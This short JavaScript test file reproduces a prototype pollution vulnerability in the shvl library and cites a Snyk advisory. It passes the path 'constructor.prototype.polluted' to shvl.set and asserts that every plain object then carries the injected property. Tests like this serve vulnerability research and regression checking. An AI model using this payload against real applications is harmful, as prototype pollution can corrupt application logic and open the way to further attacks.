//https://snyk.io/vuln/SNYK-JS-SHVL-1085284

test("prototype pollution in shvl", () => {
    
    var shvl = require("shvl")
    obj = {}

    expect({}.polluted).toBe(undefined);
    
    shvl.set(obj, 'constructor.prototype.polluted', 'yes')
    expect({}.polluted).toBe("yes");
  });
  